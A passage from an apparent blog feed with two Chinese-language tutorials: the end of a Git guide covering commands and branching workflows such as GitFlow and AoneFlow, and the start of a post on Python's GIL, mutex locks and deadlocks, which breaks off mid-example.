class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">git cherry-pick &lt;commit1&gt; &lt;commit2&gt;  <span class="hljs-comment"># 将指定的提交转移到当前分支，并在当前分支产生一个新的提交</span><br>git cherry-pick &lt;commit1&gt;..&lt;commit2&gt;  <span class="hljs-comment"># 将1~2之间的提交都转移到当前分支</span><br>git cherry-pick &lt;branch&gt;  <span class="hljs-comment"># 将指定分支的最近一次提交，转移到当前分支</span><br>git cherry-pick --<span class="hljs-built_in">continue</span>  <span class="hljs-comment"># 解决代码冲突后，继续进行cherry-pick</span><br>git cherry-pick --abort  <span class="hljs-comment"># 放弃合并（发生冲突时）</span><br></code></pre></td></tr></table></figure><blockquote><p>使用merge合并另一个分支的所有变动，使用cherry-pick合并任意分支中的部分提交。</p></blockquote><h3 id="冲突处理"><a href="#冲突处理" class="headerlink" title="冲突处理"></a>冲突处理</h3><p><img src="/img/Git%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/image-20210115183051717.png"></p><h2 id="Git-进阶"><a href="#Git-进阶" class="headerlink" title="Git 进阶"></a>Git 进阶</h2><h3 id="其他指令"><a href="#其他指令" class="headerlink" title="其他指令"></a>其他指令</h3><ul><li>git tag：标签管理</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">git tag  <span class="hljs-comment"># 查看所有标签</span><br>git tag &lt;tagname&gt; [&lt;commit&gt;]  <span class="hljs-comment"># 创建标签，默认值是HEAD</span><br>git tag -a &lt;tagname&gt; -m <span class="hljs-string">&quot;message&quot;</span>  <span class="hljs-comment"># 添加标签信息</span><br>git tag -d &lt;tagname&gt;  <span class="hljs-comment"># 删除标签</span><br><span class="hljs-comment"># 推送标签（tag）：</span><br>git push origin &lt;tagname&gt;  <span class="hljs-comment"># 推送一个本地标签</span><br>git push origin --tags  <span class="hljs-comment"># 推送全部未推送过的本地标签</span><br>git push origin :refs/tags/&lt;tagname&gt;  <span class="hljs-comment"># 删除远程标签</span><br></code></pre></td></tr></table></figure><blockquote><p>tag实际是一个指向commit的引用，保存在<code>./img/Git使用指南/refs/tags/</code>目录下，可以使用<code>git checkout &lt;tagname&gt;</code>检出</p></blockquote><ul><li>git stage：暂存</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">git stash  <span class="hljs-comment"># 保存当前工作区和暂存区的状态到git栈</span><br>git stash list  <span class="hljs-comment"># 查看git栈中的文件列表</span><br>git stash show  <span class="hljs-comment"># 查看git栈中的文件改动</span><br>git stash pop [stash@&#123;<span class="hljs-variable">$num</span>&#125;]  <span class="hljs-comment"># 从git栈中恢复一个stash（默认为最近的）</span><br>git stash apply [stash@&#123;<span class="hljs-variable">$num</span>&#125;]  <span class="hljs-comment"># 从git栈中恢复一个stash（不删除栈中的内容）</span><br>git stash branch &lt;branch&gt; [stash@&#123;<span class="hljs-variable">$num</span>&#125;]  <span class="hljs-comment"># 基于stash创建分支</span><br>git stash clear  <span class="hljs-comment"># 清空git栈中所有内容</span><br></code></pre></td></tr></table></figure><ul><li>git blame：文件追溯</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">git blame &lt;filename&gt;  <span class="hljs-comment"># 查看文件每一行的内容作者</span><br>git blame &lt;filename&gt; -L a,b  <span class="hljs-comment"># 查看文件第a行到第b行之间的内容作者</span><br></code></pre></td></tr></table></figure><ul><li><a href="http://www.ruanyifeng.com/blog/2018/12/git-bisect.html">git bisect</a>：二分查找</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">git bisect start &lt;lastCommit&gt; &lt;firstCommit&gt; <span class="hljs-comment"># 指定差错范围（自动切换回之前的版本）</span><br><span class="hljs-comment"># 例：git bisect start HEAD 4d83cf</span><br>git bisect good  <span class="hljs-comment"># 正常</span><br>git bisect bad  <span class="hljs-comment"># 异常</span><br>git bisect reset  <span class="hljs-comment"># 退出查错，回到最近一次的提交</span><br></code></pre></td></tr></table></figure><p><img src="/img/Git%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/bg2018122402.png"></p><h3 id="文件忽略"><a href="#文件忽略" class="headerlink" title="文件忽略"></a>文件忽略</h3><ol><li>使用<code>.gitignore</code>忽略不希望添加到版本库的文件。</li><li><code>.gitignore</code>文件可以放在任何目录。</li><li><code>.gitignore</code>文件<a href="https://github.com/github/gitignore">模板</a></li><li>忽略语法：<ol><li><code>.gitignore</code>文件中的空行或者以井号（#）开始的行会被忽略。</li><li>可以使用通配符：星号<code>*</code>代表任意多字符，问号<code>?</code>代表一个字符，方括号<code>[abc]</code>代表可选字符。</li><li>如果名称的最前面是一个路径分隔符<code>/</code>，表明要忽略的文件在此目录下，而非子目录的文件。</li><li>如果名称的最后面是一个路径分隔符<code>/</code>，表明要忽略的是整个目录，不忽略同名文件。</li><li>通过在名称的最前面添加一个感叹号<code>!</code>，代表不忽略。</li></ol></li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 示例：</span><br><span class="hljs-comment"># 这是注释行 —— 被忽略</span><br>*.a       <span class="hljs-comment"># 忽略所有以 .a 为扩展名的文件</span><br>!lib.a    <span class="hljs-comment"># 但是 lib.a 文件或者目录不要忽略（即使前面设置了对 *.a 的忽略）</span><br>cache     <span class="hljs-comment"># 忽略所有名称为 cache 的目录和文件</span><br>/TODO     <span class="hljs-comment"># 只忽略当前目录下的 TODO 文件，子目录的 TODO 文件不忽略</span><br>build/    <span class="hljs-comment"># 忽略所有 build/ 目录下的文件</span><br>doc/*.txt <span class="hljs-comment"># 忽略文件如 doc/notes.txt，但是文件如 doc/server/arch.txt 不被忽略</span><br></code></pre></td></tr></table></figure><h3 id="常用指令速查"><a href="#常用指令速查" class="headerlink" title="常用指令速查"></a>常用指令速查</h3><p><img src="/img/Git%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/011500266295799.jpg"></p><h2 id="Git-协同模型"><a href="#Git-协同模型" class="headerlink" title="Git 协同模型"></a>Git 协同模型</h2><h3 id="Atlassian：什么是成功的Git-Workflow？"><a href="#Atlassian：什么是成功的Git-Workflow？" class="headerlink" title="Atlassian：什么是成功的Git Workflow？"></a><a href="https://www.atlassian.com//img/Git%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/tutorials/comparing-workflows">Atlassian</a>：什么是成功的Git Workflow？</h3><p>在评估团队的工作流程时，最重要的是要考虑团队的文化。工作流程应该能够提高团队工作的效率，而不是成为限制生产力的负担。评估Git Workflow时应考虑以下几点：</p><ul><li>这个Workflow是否与团队规模相匹配？</li><li>使用这个Workflow是否容易撤销失误和修复错误？</li><li>使用这个Workflow是否会给团队带来新的不必要的认知开销？</li></ul><h3 id="Centralized-Workflow"><a href="#Centralized-Workflow" class="headerlink" title="Centralized Workflow"></a>Centralized Workflow</h3><p><img src="/img/Git%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/image-20210104195816154.png"></p><h4 id="工作模式"><a href="#工作模式" class="headerlink" title="工作模式"></a>工作模式</h4><p><img src="/img/Git%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/166109-2e8b31d4cef104ca.png"></p><ol><li><strong>管理员</strong>初始化中央存储库（裸存储库） — <code>git init --bare</code></li><li><strong>开发人员</strong>从远程仓库克隆工程到本地仓库 — <code>git clone</code></li><li>在本地仓库编辑文件和提交更新 — <code>git add </code> 和 <code>git commit</code></li><li>Fetch远程仓库已更新的commit到本地仓库，并rebase到已更新的commit的上面 — <code>git fetch</code> 和 <code>git rebase</code> 或 <code>git pull --rebase</code></li><li>Push本地master分支到远程master分支 — <code>git push</code></li></ol><h4 id="处理冲突"><a href="#处理冲突" class="headerlink" title="处理冲突"></a>处理冲突</h4><p><img src="/img/Git%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/166109-c35cfff72407266e.png"></p><ul><li>开发人员在执行第四步时，本地提交与远程提交可能会发生冲突，git会暂停rebase过程，需要使用 <code>git status</code> 和 <code>git add</code> 来手动解决冲突。</li></ul><h4 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h4><ol><li>适合从SVN过渡到分布式版本控制系统，无需改变已有的工作流程和团队协作方式。</li><li>简单、直接，完美的线性提交记录。</li><li>适合小型团队。</li></ol><h3 id="Feature-Branch-Workflow"><a href="#Feature-Branch-Workflow" class="headerlink" title="Feature Branch Workflow"></a>Feature Branch Workflow</h3><p>Feature Branch Workflow是对Centralized Workflow的逻辑扩展，其主要思想就是在开发每个功能时都应该创建<strong>一个独立的分支</strong>而不在master分支中进行。由于每个分支是独立且互不影响，这就意味着master分支中不会包含broken code，对持续集成环境很有帮助。</p><h4 id="工作模式-1"><a href="#工作模式-1" class="headerlink" title="工作模式"></a>工作模式</h4><p><img src="/img/Git%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/166109-131d038fa47a30f6.png"></p><ol><li>仍然使用远程仓库和master分支记录官方工程</li><li>开发者为每个功能或问题创建一个单独的feature分支 — <code>git checkout -b</code></li><li>在本地仓库编辑文件和提交更新 — <code>git add </code> 和 <code>git commit</code></li><li>将feature分支推送到远程仓库 — <code>git push</code></li><li>发送pull request来请求管理员是否将feature分支（远程）合并到master分支（远程）</li></ol><h4 id="Pull-Request"><a href="#Pull-Request" class="headerlink" title="Pull Request"></a>Pull Request</h4><ul><li>开发者当完成一项功能后，不会立即将其合并到master分支，而是发起一个pull request请求。</li><li>其他的团队成员接收到请求，可以审查、讨论和修改代码（Code Review）。</li><li>项目管理员合并新增的feature分支到master分支，关闭pull request。</li></ul><h4 id="优点-1"><a href="#优点-1" class="headerlink" title="优点"></a>优点</h4><ol><li>每个功能都创建一个独立的分支，易于持续集成环境。</li><li>Pull Request机制。</li><li>是一种非常灵活的开发方式。</li></ol><h3 id="TrunkBased-Workflow"><a href="#TrunkBased-Workflow" class="headerlink" title="TrunkBased Workflow"></a>TrunkBased Workflow</h3><p>Trunk based development是<a href="https://paulhammant.com/2013/04/05/what-is-trunk-based-development/">Paul Hammant</a>在2013年提出的模型，是SVN的基本开发模式。TBD模型由单个master分支（trunk）和许多release分支组成，所有开发都在trunk上进行，使用衍生出的release分支交付。</p><h4 id="工作模式-2"><a href="#工作模式-2" class="headerlink" title="工作模式"></a>工作模式</h4><p><img src="/img/Git%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/what_is_trunk.jpg"></p><ul><li>在trunk分支开发，开发完成或hotfix后衍生出release分支发布。</li><li>release分支不可修改，每一次更新，都有对应的版本号标签。</li></ul><p><strong>小规模团队：</strong>直接在trunk上进行开发。</p><p><img src="/img/Git%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/1713192-20190905112552397-1416856692.png" alt="Simple TrunkBased"></p><p><strong>大规模团队：</strong>从trunk衍生出短期的feature分支进行开发，开发完成后合并回trunk。</p><p><img src="/img/Git%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/1713192-20190905112630354-1899396857.png" alt="Complex TrunkBased"></p><h4 id="优点-2"><a href="#优点-2" class="headerlink" title="优点"></a>优点</h4><ol><li><p>模型简单</p></li><li><p>易于持续集成</p></li></ol><h3 id="GitFlow-Workflow"><a href="#GitFlow-Workflow" class="headerlink" title="GitFlow Workflow"></a>GitFlow Workflow</h3><p><a href="http://nvie.com/posts/a-successful-git-branching-model/">GitFlow Workflow</a>由Vincent Driessen在2010年首次提出并广受欢迎，它定义了围绕项目生命周期设计的严格分支模型。核心思想与Feature Branch Workflow类似，但是给特定的分支赋予了非常具体的角色，并定义它们应如何以及何时进行交互。</p><p>具体而言有四种分支：</p><ul><li>Main Branches</li><li>Feature Branches</li><li>Release Branches</li><li>Hotfix Branches</li></ul><h4 id="工作模式-3"><a href="#工作模式-3" class="headerlink" title="工作模式"></a>工作模式</h4><h5 id="Main-Branches"><a href="#Main-Branches" class="headerlink" title="Main Branches"></a>Main Branches</h5><p><img src="/img/Git%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/166109-485066c088e41b1a.png"></p><ul><li><strong>master分支：</strong>用来保存正式的、可在生产环境中部署的代码，每一次更新，都有对应的版本号标签。</li><li><strong>develop分支：</strong>从master分支派生，是每次迭代版本时的共有开发分支。</li></ul><h5 id="Feature-Branches"><a href="#Feature-Branches" class="headerlink" title="Feature Branches"></a>Feature Branches</h5><p><img src="/img/Git%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/166109-ba97394474c5dd8b.png"></p><ul><li><strong>feature分支：</strong>用来开发一项新的软件功能。</li><li>develop分支可以同时衍生出多个feature分支。</li><li>当一个feature分支开发完成后，将这个分支上的代码变更合并至develop分支。</li><li>feature分支应该永远不与master分支直接交互。</li></ul><h5 id="Release-Branches"><a href="#Release-Branches" class="headerlink" title="Release Branches"></a>Release Branches</h5><p><img src="/img/Git%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/166109-8bd4aa2579dcf341.png"></p><ul><li><strong>release分支：</strong>用来存放准备发布的代码。</li><li>当develop分支开发完成后，可以从develop衍生出一个release分支。</li><li>release分支中不应该添加任何新功能，应仅包含测试、错误修复、文档生成及其他面向发布的任务。</li><li>测试中出现的bug，统一在release分支下进行修改，并推送至远程分支。</li><li>修改内容必须合并回develop分支，上线时从release分支合并到master分支。</li><li>合并后的master应该被标记一个新的版本号。</li></ul><h5 id="Hotfix-Branches"><a href="#Hotfix-Branches" class="headerlink" title="Hotfix Branches"></a>Hotfix Branches</h5><p><img src="/img/Git%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/166109-588644ba9ef509bc.png"></p><ul><li><strong>Hotfix分支：</strong>用来快速给已发布产品修复bug或微调功能。</li><li>从master分支直接衍生出来。</li><li>完成bug修复后，合并至master分支以及develop分支。</li><li>合并后的master应该被标记一个新的版本号。</li></ul><h4 id="完整流程"><a href="#完整流程" class="headerlink" title="完整流程"></a>完整流程</h4><p><img src="/img/Git%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/image-20210105165447478.png"></p><p><img src="/img/Git%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/git-model@2x.png"></p><h4 id="优点-3"><a href="#优点-3" class="headerlink" title="优点"></a>优点</h4><ol><li>为管理大型项目提供了一个强大的框架，可用于大规模的团队协作场景。</li><li>非常适合有计划发布周期的项目，可帮助实施持续交付下的DevOps最佳实践。</li></ol><h4 id="使用场景"><a href="#使用场景" class="headerlink" title="使用场景"></a>使用场景</h4><p>企业级开发，大型团队，敏捷要求相对较低（分支存活时间长短不一、合并繁琐、依赖管理）。</p><h3 id="AoneFlow-Workflow"><a href="#AoneFlow-Workflow" class="headerlink" title="AoneFlow Workflow"></a>AoneFlow Workflow</h3><p>AoneFlow只使用三种分支类型：<strong>master分支、feature分支、release分支</strong>，以及三条基本规则。</p><h4 id="工作模式-4"><a href="#工作模式-4" class="headerlink" title="工作模式"></a>工作模式</h4><p><strong>规则一：开始工作前，从master分支创建feature分支。</strong></p><p>AoneFlow的feature分支基本借鉴GitFlow，每当开始一项新的工作时，从master分支衍生出一条feature分支（通常以<code>feature/</code>前缀命名），然后在这个分支上提交代码修改。每个工作项对应一个feature分支，所有的修改都不允许直接提交到master分支。</p><ul><li>master分支长期存在（项目的整个生命周期），由项目主要负责人管理。</li><li>feature分支作为临时分支，用于开发的具体功能特性或修复bug，在功能完成后删除。</li></ul><p><img src="/img/Git%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/bVbgRBo.png" alt="AoneFlow1"></p><p><strong>规则二：通过合并feature分支，形成release分支。</strong></p><p>从master分支上衍生出一条release分支（通常以<code>release/</code>前缀命名），将所有本次要集成或发布的feature分支依次合并过去。</p><ul><li>GitFlow：feature -&gt; develop -&gt; release</li><li>TrunkBased：master -&gt; release</li></ul><p><img src="/img/Git%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/bVbgRBD.png" alt="AoneFlow2"></p><p>release分支的用途可以很灵活，通常将每条release分支与具体的环境相对应，比如release/test对应测试环境，release/prod对应线上正式环境等等。</p><ul><li>release分支既可以为长期分支也可以为短期分支（存在于一个或者多个版本之间），由测试负责人管理。</li></ul><p><strong>规则三：发布到线上正式环境后，合并相应的release分支到master分支，在master分支上添加标签，同时删除该release分支关联的feature分支。</strong></p><p>当一条release分支完成线上正式环境的部署后，为了避免在代码仓库里堆积大量feature分支，还应该清理掉已经上线部分的feature分支。与GitFlow相似，master分支上的最新版本始终与线上版本一致，如果要回溯历史版本，只需在master分支上找到相应的版本标签即可。</p><p><img src="/img/Git%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/bVbgRBI.png" alt="AoneFlow3"></p><p><strong>其他：</strong>对于hotfix，可以创建一条新的release分支，对应线上环境。</p><h4 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h4><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs arduino">开发人员A从Master拉取代码生成feature_20210101_A_login<br>开发人员B从Master拉取代码生成feature_20210101_B_register<br><br>测试负责人Y从Master拉取release/test<br>开发人员A提交Pull Request PR1<br>开发人员B提交Pull Request PR2<br><br>开发负责人F和开发人员C评审PR1 PR2，评审通过<br><br>测试负责人Y合并代码到release/test（如果遇到合并冲突，由开发人员处理）<br>测试人员X对release/test中的代码进行测试<br>完成测试后对比Master是否比release/test时有更新，如果没有则直接使用release/test构建上线申请<br>否则从最新Master拉取分支release/prod，合并相关PR并进行回归测试<br></code></pre></td></tr></table></figure><h4 id="优点-4"><a href="#优点-4" class="headerlink" title="优点"></a>优点</h4><ol><li>每个功能都创建一个独立的分支，易于持续集成环境。</li><li>release分支的feature组成是动态的，易于调整需求或增删功能。</li><li>release分支之间是松耦合的，可以有多个集成环境分别进行不同的feature组合的集成测试。</li></ol><h3 id="Forking-Workflow"><a href="#Forking-Workflow" class="headerlink" title="Forking Workflow"></a>Forking Workflow</h3><p>Forking Workflow与以上讨论的工作流程不同，它不是多个开发者共享一个远程仓库，而是每个开发者都拥有一个独立的服务端存储库。也就是说每个contributor都有两个仓库：本地私有的仓库和远程共享的仓库。</p><p>Forking Workflow这种工作流主要好处就是每个开发者都拥有自己的远程仓库，可以将提交的commits推送到自己的远程仓库，但只有工程维护者才有权限push提交的commits到官方仓库，其他开发者在没有授权的情况下不能push。Github很多开源项目都是采用Forking Workflow工作流。</p><p><img src="/img/Git%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/166109-9819c933dc5873fb.png"></p><h4 id="工作模式-5"><a href="#工作模式-5" class="headerlink" title="工作模式"></a>工作模式</h4><ol><li>项目创建者在服务器上有一个官方的存储仓库。</li><li>开发者fork官方仓库来创建它的拷贝，然后存放在自己的服务器上。</li><li>当开发者准备好发布本地的commit时，他们push commit到他们自己的公共仓库。</li><li>在自己的公共仓库发送一个pull request到官方仓库。</li><li>维护者pull贡献者的commit到他自己的本地仓库。</li><li>审查代码确保它不会破坏工程，合并它到本地仓库的master分支。</li><li>push master分支到服务器上的官方仓库。</li><li>其他开发者应同步官方仓库。</li></ol><h4 id="优点-5"><a href="#优点-5" class="headerlink" title="优点"></a>优点</h4><ol><li>便于多人协作和独立开发。</li><li>是开源项目的理想工作流程。</li></ol><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li><a href="https://progit.bootcss.com/">Pro Git（第二版）</a></li><li><a href="http://www.worldhello.net/got/img/Git%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/index.html">Git 权威指南</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>后端开发</category>
      
      <category>通用技术</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Git</tag>
      
      <tag>工具</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>浅析 Python 中各种锁机制</title>
    <link href="/post/%E6%B5%85%E6%9E%90Python%E4%B8%AD%E5%90%84%E7%A7%8D%E9%94%81%E6%9C%BA%E5%88%B6/"/>
    <url>/post/%E6%B5%85%E6%9E%90Python%E4%B8%AD%E5%90%84%E7%A7%8D%E9%94%81%E6%9C%BA%E5%88%B6/</url>
    
    <content type="html"><![CDATA[<h2 id="并发和并行"><a href="#并发和并行" class="headerlink" title="并发和并行"></a>并发和并行</h2><ul><li>并发（Concurrency）：拥有交替处理多个任务的能力，但不是同时。通常适用于 I/O 密集型任务。</li><li>并行（Parallelism）：拥有同时处理多个任务的能力。通常适用于 CPU 密集型任务。</li></ul><h2 id="锁机制"><a href="#锁机制" class="headerlink" title="锁机制"></a>锁机制</h2><h3 id="GIL（全局解释器锁）"><a href="#GIL（全局解释器锁）" class="headerlink" title="GIL（全局解释器锁）"></a>GIL（全局解释器锁）</h3><p>GIL（Global Interpreter Lock）全局解释器锁，是最流行的 Python 解释器 <strong>CPython</strong>（官方解释器）中引入的一个概念，它使得同一个进程下任何时刻 <strong>仅有一个线程在执行</strong>，无法利用多核优势。由于GIL的存在，导致Python多线程性能甚至比单线程更糟。</p><p>在 Cpython 中，每一个线程在开始执行时，都会获得 GIL 阻止别的线程执行，在线程遇到 I/O 等会引起阻塞状态的操作时，会释放 GIL 以允许其他线程开始利用资源。同时，CPython 中还有一个 <strong>间隔检查（check interval）</strong> 机制，即 CPython 解释器会轮询检查线程 GIL 锁的获得情况，每隔一段时间就会强制当前线程释放 GIL，使别的线程能有执行的机会。这样一来，用户看到的就是“伪”并行，即 Python 线程在交替执行，但并没有真正的并行。</p><p>线程抢占 GIL 的调度流程，如下图所示：</p><p><img src="/img/Python/2-1ZS012105L23.gif" alt="GIL 工作流程示意图"></p><p><strong>引入 GIL 的原因</strong></p><ol><li>设计者为了规避类似于内存管理这样复杂的条件竞争问题。</li><li>CPython 使用了大量 C 语言库，但大部分 C 语言库都不是原生线程安全的。</li></ol><blockquote><p>注：<strong>Python GIL 不能绝对保证线程安全</strong>，因为即便 GIL 仅允许一个 Python 线程执行，但 CPython 还有 check interval 这样的抢占机制。即 GIL 的设计，主要是为了方便 CPython 解释器层的编写者，而不是为了 Python 应用层的软件工程师。</p></blockquote><p><strong>如何绕过 GIL</strong></p><ol><li>绕过 CPython，使用 JPython 等其他解释器。</li><li>把关键的性能代码，用 C 语言来实现。</li><li>多核 CPU 可使用多进程并行的方式，替代多线程并发。</li></ol><p><strong>示例：多线程访问同一变量（未加锁）</strong></p><figure class="highlight python"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></div></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> threading<br><span class="hljs-keyword">import</span> time<br><br>total = <span class="hljs-number">10</span><br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">sale</span>():</span><br>    <span class="hljs-keyword">global</span> total<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;售出第%s张票...&#x27;</span> % (<span class="hljs-number">10</span> - total + <span class="hljs-number">1</span>))<br>    <span class="hljs-comment"># time.sleep(0.001)  # 等待io操作</span><br>    total -= <span class="hljs-number">1</span><br>    <span class="hljs-comment"># time.sleep(0.001)</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;剩余%s张票\n&#x27;</span> % total)<br><br><br>threads = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>    t = threading.Thread(target=sale, args=())<br>    threads.append(t)<br><span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> threads:<br>    t.start()<br><span class="hljs-comment"># cpu密集型（注释掉io操作）：结果符合预期（线程start前total-=1已经计算完成）</span><br><span class="hljs-comment"># io密集型：结果异常</span><br></code></pre></td></tr></table></figure><h3 id="互斥锁（同步锁）"><a href="#互斥锁（同步锁）" class="headerlink" title="互斥锁（同步锁）"></a>互斥锁（同步锁）</h3><p>互斥锁（Mutex），保证同一时间只能有一个线程修改共享数据，解决了上述io密集型场景产生的计算错误问题。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> threading<br><span class="hljs-keyword">import</span> time<br><br>total = <span class="hljs-number">10</span><br>lock = threading.Lock()<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">sale</span>():</span><br>    <span class="hljs-keyword">global</span> total<br>    lock.acquire()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;正在售出第%s张票...&#x27;</span> % (<span class="hljs-number">10</span> - total + <span class="hljs-number">1</span>))<br>    time.sleep(<span class="hljs-number">0.001</span>)  <span class="hljs-comment"># 等待io操作</span><br>    total -= <span class="hljs-number">1</span><br>    time.sleep(<span class="hljs-number">0.001</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;剩余%s张票\n&#x27;</span> % total)<br>    lock.release()<br><br><br>threads = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>    t = threading.Thread(target=sale, args=())<br>    threads.append(t)<br><span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> threads:<br>    t.start()<br></code></pre></td></tr></table></figure><h3 id="死锁"><a href="#死锁" class="headerlink" title="死锁"></a>死锁</h3><p>由于保护不同的数据应该使用不同的互斥锁，当有多个互斥锁存在的时候，就可能会导致死锁。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 发生死锁的情况</span><br><span class="hljs-keyword">import</span> threading<br><span class="hljs-keyword">import</span> time<br><br>lockA = threading.Lock()<br>lockB = threading.Lock()<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">foo</span>():</span><br>    lockA.acquire()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;func foo acquire lockA&#x27;</span>)<br>    lockB.acquire()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;func foo acquire lockB&#x27;</span>)<br>    lockA.release()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;func foo release lockA&#x27;</span>)<br>    lockB.release()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;func foo release lockB&#x27;</span>)<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">bar</span>():</span><br>    lockB.acquire()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;func bar acquire lockB&#x27;</span>)<br>    time.sleep(<span class="hljs-number">1</span>)  <span class="hljs-comment"># 等待io操作</span><br>    lockA.acquire()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;func bar acquire 